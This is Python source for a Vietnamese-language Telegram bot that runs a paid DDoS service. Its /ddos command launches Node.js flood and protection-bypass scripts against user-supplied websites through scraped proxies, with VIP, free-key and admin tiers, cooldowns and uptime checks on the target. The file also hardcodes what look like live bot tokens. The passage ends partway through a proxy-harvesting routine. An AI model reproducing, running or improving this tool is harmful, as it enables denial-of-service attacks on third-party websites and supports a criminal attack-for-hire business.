import logging, aiofiles, secrets, time, hashlib, datetime,subprocess, aiohttp
from typing import Set, Tuple
from typing import Tuple
from collections import Counter, defaultdict
import random, asyncio, os, sys
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    CallbackQueryHandler,
    CallbackContext,
    ContextTypes
)
from telegram.error import NetworkError, TelegramError, TimedOut , RetryAfter
import threading
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import json
import requests
import psutil
from functools import wraps, partial
from datetime import datetime, date
import pytz
import re
import ipaddress

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler("ddos.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Constants
TOKEN = '7175807614:AAEUtNjcRb72BJJL0hIsRGcVySYL8hfcS6E' #use 
# TOKEN = '7689457850:AAHYuqviFOIVGhgaBVXadDenURuoysBnSSU' #test 
ADMIN_IDS = [6464715777, 7371969470]  
admins = set(ADMIN_IDS) 
ALLOWED_GROUP_ID = -1002259079939 # usse
# ALLOWED_GROUP_ID = -1002371455370 # tess
MAX_RETRIES = 3
RETRY_DELAY = 5
STATUS_CHECK_COOLDOWN = 5
MAX_CHECK_ATTEMPTS = 5
monitoring_task = None
MONITOR_CHAT_ID = -1002313372403 # info cpu gpu
# MONITOR_CHAT_ID = -1002371455370 # info cpu gpu test

# Global variables
bot_active = True
status_check_counts = defaultdict(int)
status_check_cooldowns = {}
attack_processes = {}

# File paths
# attack_history_file = "attack_history.json"
# admin_file = "admin.txt"

# Timezone setup
vietnam_tz = pytz.timezone('Asia/Ho_Chi_Minh')
def get_vietnam_time():
    return datetime.now(vietnam_tz)

def TimeStamp():
    now = str(date.today())
    return now

# Initialize time variables
last_reset_time = datetime.now(vietnam_tz)
current_time = datetime.now(vietnam_tz)
start_time = datetime.now(vietnam_tz)

class ReloadOnChangeHandler(FileSystemEventHandler):
    def __init__(self, restart_callback):
        super().__init__()
        self.restart_callback = restart_callback

    def on_modified(self, event):
        if event.src_path.endswith(".py"):
            logger.info("Detected code change. Restarting bot...")
            self.restart_callback()

def restrict_room(func=None, *, ignore_restriction=False, enable_cooldown=False):
    if func is None:
        return partial(restrict_room, ignore_restriction=ignore_restriction, enable_cooldown=enable_cooldown)
        
    @wraps(func)
    async def wrapper(update: Update, context: CallbackContext):
        if update.message is None:
            return
            
        user_id = update.message.from_user.id
        chat_id = update.message.chat_id
        
        # Kiểm tra bot_active và user_id
        if not bot_active and user_id not in admins and func.__name__ != "bot_on":
            await update.message.reply_text("Bot hiện đang tắt.")
            return

        # Kiểm tra CPU và RAM usage
        if func.__name__ == "ddos":  # Chỉ kiểm tra cho lệnh ddos
            try:
                cpu_percent = psutil.cpu_percent(interval=1)
                memory = psutil.virtual_memory()
                memory_percent = memory.percent

                if cpu_percent >= 85 or memory_percent >= 85:
                    await update.message.reply_text(f'''
╔═════════════════════════
║ ⚠️ CẢNH BÁO TÀI NGUYÊN
║ • CPU: {cpu_percent}%
║ • RAM: {memory_percent}%
║ • Hệ thống đang quá tải
║ • Vui lòng thử lại sau
╚═══════════════════════════''')
                    return
            except Exception as e:
                logger.error(f"Error checking system resources: {e}")
            
        if chat_id != ALLOWED_GROUP_ID and not ignore_restriction:
            return
            
        return await func(update, context)
            
    return wrapper

@restrict_room(ignore_restriction=True)  # Cho phép sử dụng ở mọi chat
async def bot_off(update: Update, context: CallbackContext):
    global bot_active
    user_id = update.message.from_user.id
    
    if not bot_active:
        await update.message.reply_text('Bot hiện đang tắt.')
        return
        
    if user_id in admins:  # Sửa thành so sánh bằng vì ADMIN_ID là số
        bot_active = False
        await update.message.reply_text('Bot đã được tắt.')
    else:
        # await update.message.reply_text('Bạn không có quyền thực hiện thao tác này.')
        pass

@restrict_room(ignore_restriction=True)  # Cho phép sử dụng ở mọi chat  
async def bot_on(update: Update, context: CallbackContext):
    global bot_active
    user_id = update.message.from_user.id
    
    if user_id in admins:  # Sửa thành so sánh bằng vì ADMIN_ID là số
        bot_active = True
        await update.message.reply_text('Bot đã được bật.')
    else:
        # await update.message.reply_text('Bạn không có quyền thực hiện thao tác này.')
        pass
# END ADMIN CONMAND 

async def error_handler(update: object, context: CallbackContext) -> None:
    logger.error("Exception while handling an update:", exc_info=context.error)
    
    try:
        if isinstance(context.error, TimedOut):
            if update and update.effective_chat:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text="⌛ Timeout error. Retrying..."
                )
        elif isinstance(context.error, NetworkError):
            if update and update.effective_chat:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text="🌐 Network error. Retrying..."
                )
        else:
            if update and update.effective_chat:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"❌ An error occurred: {str(context.error)}"
                )
            logger.error(f"Update {update} caused error {context.error}")
    except Exception as e:
        logger.error(f"Error in error handler: {e}", exc_info=True)

# SQl connect
import pytz
from datetime import date
import mysql.connector
from modules.database_connection import DatabaseConnection
def get_vietnam_time():
    tz = pytz.timezone('Asia/Ho_Chi_Minh')
    return datetime.now(tz)
def TimeStamp():
  now = str(date.today())
  return now
vietnam_tz = pytz.timezone('Asia/Ho_Chi_Minh')
last_reset_time = datetime.now(vietnam_tz)
current_time = datetime.now(vietnam_tz)
start_time = datetime.now(vietnam_tz)

db = DatabaseConnection.get_instance()
def load_users_from_mysql():
    try:
        db = DatabaseConnection.get_instance()
        query = "SELECT user_id, expiration_time, expiration_key_time, using_key FROM users"
        results = db.execute_query(query)
        
        if results is None:
            return set(), set(), {}
            
        vip_users = set()
        freeuser = set()
        vip_expiration = {}
        
        if results:
            for (user_id, expiration_time, expiration_key_time, using_key) in results:
                # Convert naive datetime to aware datetime with Vietnam timezone
                if expiration_time:
                    expiration_time = vietnam_tz.localize(expiration_time)
                if expiration_key_time:
                    expiration_key_time = vietnam_tz.localize(expiration_key_time)
                    
                current_time = datetime.now(vietnam_tz)
                
                if expiration_time and expiration_time > current_time:
                    vip_users.add(user_id)
                    vip_expiration[user_id] = expiration_time
                elif using_key and expiration_key_time and expiration_key_time > current_time:
                    freeuser.add(user_id)
        
        return vip_users, freeuser, vip_expiration
    except Exception as e:
        # Log error if needed
        return set(), set(), {}

vip_users, freeuser, vip_expiration = load_users_from_mysql() or (set(), set(), {})
# End SQl connect
# DDoS
user_cooldowns_ddos = {}
user_cooldowns_ddos_vip = {}
# Định nghĩa các cấu hình cho VIP và FREE users
VIP_CONFIG = {
    'methods': ['FLOOD', 'BYPASS', 'FLOOD2', 'BYPASS2'],  # Thêm 2 phương thức mới
    'time': 120,  # thời gian ddos vip
    'rate': 15,
    'threads': 10,
    'proxy': './modules/proxy.txt', 
    'cooldown': 150  # thời gian chờ vip
}
FREE_CONFIG = {
    'methods': ['FLOOD'],
    'time': 70,  # thời gian ddos free
    'rate': 8,
    'threads': 4,
    'proxy': './modules/proxy.txt',
    'cooldown': 120  # thời gian chờ free
}
# Dictionary lưu thời gian cooldown của user
user_cooldowns = {}

def validate_url(url: str) -> Tuple[bool, str]:
    # Blacklist domains
    blacklist = [
        "bdu", "edu",  "chinhphu", "cloudflare", "gov", "google", 
        "facebook", "tiktok", "microsoft", "apple", "amazon", 
        "netflix", "twitter", "instagram", "github", "gitlab", 
        "heroku", "azure", "aws", "alibaba", "oracle", "ibm", 
        "cisco", "akamai", "youtube", "yahoo", "bing", "paypal", 
        "shopify", "wix", "squarespace", "digitalocean", "linode", 
        "vultr", "godaddy", "namecheap", "cloudways", "plesk", "cpanel"
    ]
    
    # Loại bỏ khoảng trắng
    url = url.strip().lower()  # Convert to lowercase for case-insensitive comparison
    
    # Kiểm tra độ dài URL
    if len(url) < 3 or len(url) > 2048:
        return False, "❌ URL không hợp lệ (độ dài không phù hợp)"

    # Thêm schema nếu không có
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    try:
        # Parse URL để kiểm tra các thành phần
        from urllib.parse import urlparse
        parsed = urlparse(url)
        
        # Kiểm tra hostname
        hostname = parsed.hostname
        if not hostname:
            return False, "❌ URL không hợp lệ (không có hostname)"

        # Kiểm tra IP address
        try:
            ipaddress.ip_address(hostname)
            return False, "❌ Không hỗ trợ tấn công IPv4/IPv6"
        except ValueError:
            pass

        # Kiểm tra blacklist
        for blocked in blacklist:
            if blocked in hostname:
                return False, f'''
❌ Url bị cấm
'''

        # Kiểm tra các ký tự không hợp lệ trong URL
        invalid_chars = set('<>"{}|\\^`')
        if any(char in url for char in invalid_chars):
            return False, "❌ URL chứa ký tự không hợp lệ"

        # Kiểm tra độ dài của từng phần
        if len(hostname) > 253:  # Max length of domain name
            return False, "❌ Domain quá dài"
        
        if parsed.path and len(parsed.path) > 1024:
            return False, "❌ Path quá dài"

        # Kiểm tra TLD hợp lệ (ít nhất 2 ký tự)
        tld = hostname.split('.')[-1]
        if len(tld) < 2:
            return False, "❌ TLD không hợp lệ"

        return True, url

    except Exception as e:
        logger.error(f"URL validation error: {str(e)}")
        return False, "❌ URL không hợp lệ"

# Methods
@restrict_room(ignore_restriction=True)
async def methods(update: Update, context: CallbackContext):
    # Dictionary chứa mô tả cho từng phương thức
    method_descriptions = {
        'FLOOD': 'Website không có bảo vệ',
        'BYPASS': 'Có khả năng vượt 1 số biện pháp bảo vệ',
        'FLOOD2': 'Website không có bảo vệ',
        'BYPASS2': 'Khả năng vượt qua bảo vệ hên xu'
    }
    
    # Tạo danh sách phương thức với mô tả
    methods_list = '\n'.join(
        f'• <code>{method}</code>\n  └─ {method_descriptions.get(method, "Không có mô tả")}'
        for method in VIP_CONFIG['methods']
    )
    
    message = f'''
╔═════════════════════════
║ 📝 PHƯƠNG THỨC TẤN CÔNG
{methods_list}
║ 💡 Sử dụng với /ddos
╚═══════════════════════════'''
    
    await update.message.reply_text(message, parse_mode='HTML')
# End Methods

import shutil

def get_node_path():
    """Get the correct path to Node.js executable"""
    try:
        # Thử lấy đường dẫn từ which
        node_path = subprocess.check_output(['which', 'node'], 
                                          universal_newlines=True).strip()
        if node_path:
            return node_path
    except:
        # Các đường dẫn phổ biến để tìm node
        possible_paths = [
            '/usr/bin/node',
            '/usr/local/bin/node',
            '/root/.nvm/versions/node/v22.11.0/bin/node',  # NVM path
            os.path.expanduser('~/.nvm/versions/node/v22.11.0/bin/node')
        ]
        
        for path in possible_paths:
            if os.path.exists(path):
                return path
                
    return None

# Lấy đường dẫn node một lần khi khởi động
NODE_PATH = get_node_path()

active_attacks = {} 
@restrict_room
async def ddos(update: Update, context: CallbackContext):
    vip_users, freeuser, vip_expiration = load_users_from_mysql() or (set(), set(), {})
    try:
        user_id = update.message.from_user.id
        current_time = time.time()
        # Kiểm tra user type và admin
        is_admin = user_id in admins
        is_vip = user_id in vip_users
        is_free = user_id in freeuser
        if not NODE_PATH:
            await update.message.reply_text('''
╔═════════════════════════
║ ❌ LỖI KHỞI ĐỘNG
║ • Không tìm thấy Node.js
║ • Vui lòng kiểm tra cài đặt
╚═══════════════════════════''')
            return
        if not is_admin and user_id in active_attacks: # bỏ qua admin 
            attack_info = active_attacks[user_id]
            remaining_time = int(attack_info['end_time'] - current_time)
            
            if remaining_time > 0:
                await update.message.reply_text(f'''
╔═════════════════════════
║ ⚠️ Spam t kích bây giờ
║ • Đang tấn công: <code>{attack_info['target']}</code>
║ • Thời gian chờ còn lại: {remaining_time} giây
╚═══════════════════════════''', parse_mode='HTML')
                return
            else:
                # Nếu thời gian đã hết, xóa thông tin tấn công
                del active_attacks[user_id]

        if not (is_admin or is_vip or is_free):
            await update.message.reply_text('''
╔═══════════════════════════
║ • Mua VIP hoặc lấy KEY để /ddos
║ • Lấy key: /laykey
║ • Xác thực key: /key + key đã lấy
╚═══════════════════════════''')
            return

        # Thiết lập config dựa trên loại user
        if is_admin:
            config = VIP_CONFIG.copy()
            config['cooldown'] = 0
            config['time'] = 200  
            config['rate'] = 15   
            config['threads'] = 10  
        elif is_vip:
            config = VIP_CONFIG.copy()
        else:
            config = FREE_CONFIG.copy()

        # Kiểm tra cooldown (bỏ qua nếu là admin)
        if not is_admin:
            last_used = user_cooldowns.get(user_id, 0)
            if current_time - last_used < config['cooldown']:
                remaining = int(config['cooldown'] - (current_time - last_used))
                await update.message.reply_text(f'''
╔═════════════════════════
║ ⏳ VUI LÒNG ĐỢI
║ • Còn {remaining}s để gọi lệnh /ddos
╚═══════════════════════════''')
                return

        args = context.args
        if len(args) < 1:
            await update.message.reply_text('''
╔═════════════════════════
║ 📝 HƯỚNG DẪN ADMIN DDOS
║ ▶ Cách 1:
║ • /ddos + methods + url + time
║ • VD: /ddos FLOOD example.com 300
║ ▶ Cách 2:
║ • /ddos + url + time
║ • VD: /ddos example.com 300
║ ▶ Phương thức:
║ • FLOOD: Tấn công thường
║ • BYPASS: Tấn công bypass
║ • FLOOD2: Tấn công non-protection
║ • BYPASS2: Tấn công try-protection
║ 💡 /methods: để xem phương thức
╚═══════════════════════════''')
            return
        elif is_vip:
            if len(args) < 1:
                await update.message.reply_text(f'''
╔═════════════════════════
║ 📝 DDOS VIP USER
║ ▶ Cách 1:
║ • /ddos + url
║ • VD: /ddos example.com
║ ▶ Cách 2:
║ • /ddos + phương thức + url
║ • VD: /ddos BYPASS example.com
║ ▶ Phương thức:
║ • FLOOD: Tấn công thường
║ • BYPASS: Tấn công bypass
║ • FLOOD2: Tấn công non-protection
║ • BYPASS2: Tấn công try-protection
║ ▶ Thông tin:
║ • Thời gian: {config['time']}s
║ • Cooldown: {config['cooldown']}s
╚══════════════════════════''')
                return
        else:  # FREE user
            if len(args) < 1:
                await update.message.reply_text(f'''
╔═════════════════════════
║ 📝 DDOS FREE USER
║ • /ddos + url
║ • VD: /ddos example.com
║ ▶ Thông tin:
║ • Thời gian: {config['time']}s
║ • Cooldown: {config['cooldown']}s
║ • Chỉ hỗ trợ: FLOOD
╚═══════════════════════════''')
                return

        # Xử lý arguments dựa trên loại user
        if is_admin:
            if args[0].upper() in config['methods']:
                method = args[0].upper()
                url = args[1] if len(args) > 1 else None
                attack_time = int(args[2]) if len(args) > 2 and args[2].isdigit() else config['time']
            else:
                method = 'FLOOD'  # Default method
                url = args[0]
                attack_time = int(args[1]) if len(args) > 1 and args[1].isdigit() else config['time']
        elif is_vip:
            if args[0].upper() in config['methods']:
                method = args[0].upper()
                url = args[1] if len(args) > 1 else None
            else:
                method = 'FLOOD'
                url = args[0]
            attack_time = config['time']
        else:  # FREE user
            # Luôn sử dụng method FLOOD và lấy URL từ argument cuối cùng
            method = 'FLOOD'
            url = args[-1]  # Lấy argument cuối cùng làm URL
            attack_time = config['time']

        if url is None:
            await update.message.reply_text('Sử dụng /ddos để xem hướng dẫn')
            return
        # Validate URL
        is_valid, result = validate_url(url)
        if not is_valid:
            await update.message.reply_text(result)
            return
        url = result  # Use validated and formatted URL

        # Lấy các thông số từ config
        rate = config['rate']
        threads = config['threads']
        proxy = config['proxy']

        max_time = 200 # đảm bảo không vượt quá thời gian. Nếu vượt -> 200 ( max tine ddos)
        if attack_time > max_time:
            attack_time = max_time
        try:
            if not is_admin:
                active_attacks[user_id] = {
                    'end_time': current_time + attack_time,
                    'target': url
                }
            if method == 'FLOOD2':
                try:
                    process = subprocess.Popen([
                        # 'node',
                        NODE_PATH, 
                        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'modules/non-protection.js'),
                        url,                             # target (process.argv[2])
                        str(min(attack_time, max_time)), # time (process.argv[3])
                        str(rate),                       # Rate (process.argv[4])
                        str(threads),                    # threads (process.argv[5])
                        proxy                            # proxyFile (process.argv[6])
                    ])
                    attack_processes[update.message.chat_id] = process
                except Exception as e:
                    logger.error(f"Error starting FLOOD2 attack: {e}")
                    await update.message.reply_text("❌ Không thể khởi động FLOOD2")
                    return
            elif method == 'BYPASS2':
                try:
                    process = subprocess.Popen([
                        # 'node',
                        NODE_PATH, 
                        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'modules/try-protection.js'),
                        'GET',
                        str(min(attack_time, max_time)), 
                        str(threads),
                        proxy,
                        str(rate),
                        url
                    ])
                    attack_processes[update.message.chat_id] = process
                except Exception as e:
                    logger.error(f"Error starting BYPASS2 attack: {e}")
                    await update.message.reply_text("❌ Không thể khởi động BYPASS2")
                    return
            elif method == 'BYPASS':
                try:
                    process = subprocess.Popen([
                    # 'node',
                    NODE_PATH, 
                    '--max-old-space-size=4096',
                    os.path.join(os.path.dirname(os.path.abspath(__file__)), 'modules/two-methods.js'),
                    url,
                    str(min(attack_time, max_time)), 
                    str(rate),
                    str(threads),
                    proxy,
                    method
                    ])
                    attack_processes[update.message.chat_id] = process
                except Exception as e:
                    logger.error(f"Error starting BYPASS2 attack: {e}")
                    await update.message.reply_text("❌ Không thể khởi động BYPASS2")
                    return
            else:
                process = subprocess.Popen([
                    # 'node',
                    NODE_PATH,
                    '--max-old-space-size=4096',
                    os.path.join(os.path.dirname(os.path.abspath(__file__)), 'modules/two-methods.js'),
                    url,
                    str(min(attack_time, max_time)), 
                    str(rate),
                    str(threads),
                    proxy,
                    method
            ])
            attack_processes[update.message.chat_id] = process
            
        except Exception as e:
            logger.error(f"Error starting attack process: {e}")
            await update.message.reply_text('''
╔═════════════════════════
║ ❌ LỖI KHỞI ĐỘNG
║ • Không thể bắt đầu tấn công
║ • Vui lòng thử lại sau
╚═══════════════════════════''')
            return

        # Cập nhật cooldown
        user_cooldowns[user_id] = current_time

        # Create keyboard
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("🔍 Check host", url=f"https://check-host.net/check-http?host={url}"),
                InlineKeyboardButton("📊 Kiểm tra nhanh", callback_data=f"st_{url}")
            ]
        ])

        # Xác định user type cho tin nhắn
        if is_admin:
            user_type = "ADMIN"
        elif is_vip:
            user_type = "VIP"
        else:
            user_type = "FREE"

        attack_msg = await update.message.reply_text(
            f'''
╔═════════════════════════
║ 🚀 Bắt đầu tấn công [{user_type}]
║ • Website: <code>{url}</code>
║ • Thời gian: {attack_time}s
║ • Request/s: {rate}
║ • Luồng: {threads}
║ • Phương thức: {method}
║ • Sử dụng lại trong: {config['cooldown']} giây
╚═══════════════════════════''',
            reply_markup=keyboard,
            parse_mode='HTML'
        )

        async def end_attack():
            try:
                await asyncio.sleep(attack_time)
                
    
                if process.poll() is None:  
                    process.terminate()
                    try:
                        process.wait(timeout=5) 
                    except subprocess.TimeoutExpired:
                        process.kill()  
                
                attack_processes.pop(update.message.chat_id, None)
                
                try:
                    await attack_msg.edit_text(
                        f'''
╔══════════════════════════
║ 🛑 Dừng tấn công
║ • Website: <code>{url}</code>
║ • Thời gian: {attack_time}s
║ • Phương thức: {method}
║ • Trạng thái: Hoàn thành
╚═══════════════════════════''',
                        parse_mode='HTML'
                    )
                except Exception as e:
                    logger.error(f"Error updating end message: {e}")
                    
            except Exception as e:
                logger.error(f"Error in end_attack: {e}")

        asyncio.create_task(end_attack())
        
    except Exception as e:
        logger.error(f"Error in ddos command: {e}")
        await update.message.reply_text(f"❌")

async def handle_status_check(update: Update, context: CallbackContext):
    query = update.callback_query
    try:
        message_id = f"{query.message.chat.id}_{query.message.message_id}"
        user_id = query.from_user.id
        current_time = time.time()
        
        url = query.message.text.split('Website: ')[1].split('\n')[0].strip()
        if url.startswith('<code>'):
            url = url[6:-7]
            
        status_check_counts[message_id] += 1
        
        if status_check_counts[message_id] > MAX_CHECK_ATTEMPTS:
            await query.message.delete()
            await query.answer(
                "❌ Max check attempts exceeded",
                show_alert=True
            )
            return
            
        last_check = status_check_cooldowns.get(user_id, 0)
        if current_time - last_check < STATUS_CHECK_COOLDOWN:
            remaining = round(STATUS_CHECK_COOLDOWN - (current_time - last_check))
            remaining_checks = MAX_CHECK_ATTEMPTS - status_check_counts[message_id]
            await query.answer(
                f"⏳ Đợi {remaining}s để kiểm tra lại\n"
                f"📊 {remaining_checks} lượt kiểm tra",
                show_alert=True
            )
            return
            
        status_check_cooldowns[user_id] = current_time
        
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("🔍 Kiểm tra Website", url=f"https://check-host.net/check-http?host={url}"),
                InlineKeyboardButton("⏳ Đang xử lý", callback_data="cooldown")
            ]
        ])

        remaining_checks = MAX_CHECK_ATTEMPTS - status_check_counts[message_id]
        await query.message.edit_text(
            f'''
╔═══════════════════════════
║ ⏳ ĐANG KIỂM TRA WEBSITE
║ • Website: <code>{url}</code>
║ • {remaining_checks} lượt kiểm tra
║ ⚠️ Vui lòng đợi...
╚═══════════════════════════''',
            reply_markup=keyboard,
            parse_mode='HTML'
        )
        try:
            response = await asyncio.wait_for(
                asyncio.get_event_loop().run_in_executor(
                    None, 
                    lambda: requests.get(url, timeout=10)
                ),
                timeout=10
            )
            
            status_code = response.status_code
            if status_code == 200:
                status = "🟢 Sống"
            elif status_code >= 500:
                status = "🔴 Chết"  
            else:
                status = f"🟡 Phản hồi: {status_code}"
                
        except (requests.Timeout, asyncio.TimeoutError):
            status = "🔴 TIMEOUT HOẶC Chết"
            response = None
            
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("🔍 Check host", url=f"https://check-host.net/check-http?host={url}"),
                InlineKeyboardButton("📊 Kiểm tra nhanh", callback_data=f"st_{url}")
            ]
        ])
        
        response_time = response.elapsed.total_seconds() if response else 10
        await query.message.edit_text(
            f'''
╔══════════════════════════
║ 📊 TRẠNG THÁI WEBSITE
║ ▶ Thông tin:
║ • Website: <code>{url}</code>
║ • Trạng thái: {status}
║ • Thời gian phản hồi: {response_time:.2f} giây
║ • Kiểm tra lại: {STATUS_CHECK_COOLDOWN} giây
║ • {remaining_checks} lượt kiểm tra
╚═══════════════════════════''',
            reply_markup=keyboard,
            parse_mode='HTML'
        )
            
    except Exception as e:
        logger.error(f"Error checking status: {e}")

async def cleanup_attacks():
    """Clean up all running attack processes"""
    for chat_id, process in attack_processes.items():
        try:
            if process.poll() is None:
                process.terminate()
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    process.kill()
        except Exception as e:
            logger.error(f"Error cleaning up process for chat {chat_id}: {e}")
    attack_processes.clear()

# Start Proxy
from datetime import datetime, timedelta
import asyncio
# Các biến global để kiểm soát
last_proxy_update = 0
PROXY_UPDATE_INTERVAL = 1800  
MAX_UPDATE_TIME = 1740  
proxy_update_lock = asyncio.Lock()
is_updating = False  
is_proxy_update_running = False
is_proxy_update_running = False
proxy_cron_task = None
async def check_proxy(proxy, timeout=5):
    """Kiểm tra proxy có hoạt động không"""
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(
                "http://google.com",
                proxy=f"http://{proxy}",
                timeout=aiohttp.ClientTimeout(total=timeout)
            ) as response:
                return response.status == 200
    except:
        return False

async def update_proxy(restart=False):
    try:
        logger.info("Starting proxy update...")
        start_time = time.time()
        KEEP_BEST_PROXIES = 10000
        MAX_ATTEMPTS = 3
        MIN_NEW_PROXIES = 100  # Số lượng proxy mới tối thiểu cần tìm
        
        proxy_path = './modules/proxy.txt'
        existing_proxies = set()  # Sử dụng set để tránh trùng lặp
        
        # Đọc proxy hiện có và giới hạn số lượng nếu cần
        if os.path.exists(proxy_path):
            try:
                with open(proxy_path, 'r') as f:
                    existing_proxies = {line.strip() for line in f if line.strip()}
                logger.info(f"Found {len(existing_proxies)} existing proxies")

                # Nếu số proxy vượt quá giới hạn, chọn ngẫu nhiên KEEP_BEST_PROXIES proxy
                if len(existing_proxies) > KEEP_BEST_PROXIES:
                    existing_proxies = set(random.sample(list(existing_proxies), KEEP_BEST_PROXIES))
                    logger.info(f"Randomly selected {KEEP_BEST_PROXIES} proxies to keep")
                    
                    # Lưu lại danh sách proxy đã giới hạn
                    with open(proxy_path, 'w') as f:
                        f.write('\n'.join(existing_proxies))
                    logger.info(f"Saved {len(existing_proxies)} proxies after limiting")
                
                # Backup file proxy
                backup_path = f"{proxy_path}.backup"
                with open(backup_path, 'w') as f:
                    f.write('\n'.join(existing_proxies))
            except Exception as e:
                logger.error(f"Error reading existing proxies: {e}")
                existing_proxies = set()

        # Danh sách các URL proxy
        proxy_urls = [
            'https://daudau.org/api/http.txt',
            'https://api.proxyscrape.com/?request=displayproxies&proxytype=http',
            'https://api.proxyscrape.com/?request=displayproxies&proxytype=https',
            'http://alexa.lr2b.com/proxylist.txt',
            'http://rootjazz.com/proxies/proxies.txt',
            'http://worm.rip/http.txt',
            'https://api.openproxylist.xyz/http.txt',
            'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http',
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=anonymous',
            'https://multiproxy.org/txt_all/proxy.txt',
            'https://openproxylist.xyz/http.txt',
            'https://proxyspace.pro/http.txt',
            'https://proxyspace.pro/https.txt',
            'https://proxy-spider.com/api/proxies.example.txt',
            'https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt',
            'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt',
            'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/https_proxies.txt',
            'https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt',
            'https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt',
            'https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/https.txt',
            'https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks4.txt',
            'https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt',
            'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt',
            'https://raw.githubusercontent.com/jepluk/PROXYLIST/main/all.json',
            'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt',
            'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt',
            'https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt',
            'https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt',
            'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
            'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/http.txt',
            'https://raw.githubusercontent.com/MrMarble/proxy-list/main/all.txt',
            'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
            'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http_checked.txt',
            'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5_checked.txt',
            'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
            'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt',
            'https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt',
            'https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt',
            'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt',
            'https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt',
            'https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies_anonymous/http.txt',
            'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
            'https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/cnfree.txt',
            'https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/free.txt',
            'https://raw.githubusercontent.com/saisuiu/uiu/main/free.txt',
            'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
            'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt',
            'https://raw.githubusercontent.com/Simatwa/free-proxies/master/files/http.json',
            'https://raw.githubusercontent.com/Simatwa/free-proxies/master/files/socks5.json',
            'https://raw.githubusercontent.com/sunny9577/proxy-list/master/proxy-list-raw.txt',
            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
            'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
            'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt',
            'https://raw.githubusercontent.com/tuanminpay/live-proxy/master/socks4.txt',
            'https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt',
            'https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/https.txt',
            'https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt',
            'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt',
            'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt',
            'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks4.txt',
            'https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt',
            'https://spys.me/proxy.txt',
            'https://spys.me/socks.txt',
            'https://sunny9577.github.io/proxy-scraper/proxies.txt',
            'https://www.proxy-list.download/api/v1/get?type=http',
            'https://www.proxy-list.download/api/v1/get?type=http&anon=elite&country=US',
            'https://www.proxy-list.download/api/v1/get?type=http&anon=transparent&country=US',
            'https://www.proxy-list.download/api/v1/get?type=https',
        ]

        working_proxies = set(existing_proxies)
        used_urls = set()  # Theo dõi các URL đã sử dụng
        BATCH_SIZE = 100
        new_proxies_found = 0

        while len(used_urls) < len(proxy_urls) and new_proxies_found < MIN_NEW_PROXIES:
            # Chọn URL chưa sử dụng
            available_urls = [url for url in proxy_urls if url not in used_urls]
            if not available_urls:
                break
                
            url = random.choice(available_urls)
            used_urls.add(url)
